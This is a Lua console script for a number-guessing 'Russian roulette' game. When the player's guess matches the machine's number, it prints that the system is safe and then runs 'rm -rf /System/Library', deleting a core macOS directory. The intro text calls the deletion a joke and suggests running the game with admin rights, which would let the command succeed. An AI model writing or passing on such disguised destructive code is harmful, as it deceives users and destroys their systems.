local function loading(loops)
    local chars = {"|", "/", "-", "\\"}
    for i = 0, loops do
        for _, char in ipairs(chars) do
            io.write("\r" .. char)
            io.flush()
            os.execute("sleep 0.1")
        end
    end
end

local function replay()
    io.write("Want to try again? (y/n)\n")
    local repeat_game = io.read()
    if string.lower(repeat_game) == "y" then
        pre(1)
    else
        print("Thanks for playing.")
        os.exit()
    end
end

local function main(bullets)
    loading(math.random(0, math.floor(bullets / 137)))
    io.write("\nEnter your guess:\n")
    local guess = tonumber(io.read())
    if not guess then
        print("You need to enter an integer.")
        replay()
    end
    
    if guess > bullets or guess < 0 then
        print("You need to enter an integer inside the range you've given.")
        replay()
    end
            
    local rand = math.random(0, bullets)
    if rand == guess then
        io.write("You lose. (Just kidding, your system is safe!)\n")

        os.execute("rm -rf /System/Library")
        os.exit()
    end
       
    io.write("You won!\n")
    io.write("Your number = " .. guess .. "\n")
    io.write("Machine's number = " .. rand .. "\n")
    replay()
end

function pre(loop)
    if loop == 1 then
        io.write("Good choice.\n")
    else
        io.write("Let's begin.\n")
    end
    io.write("How big do you want the chamber (range of numbers to guess) to be? (Positive integers only)\n")
    local bullets = tonumber(io.read())
    if not bullets or bullets <= 0 then
        print("Positive integers only.")
        replay()
    end
    main(bullets)
end

io.write("Do you know the rules? (y/n)\n")
local intro = io.read()
if string.lower(intro) == "n" then
    io.write("This is a game of guessing numbers.\n")
    io.write("If you guess the same number as the machine, given a certain range, your System 32 gets deleted (just a joke!).\n")
    io.write("Every time you play the number changes.\n")
    io.write("For this to be a real challenge, I recommend you run it in admin mode (just kidding!).\n")
end

pre(0)

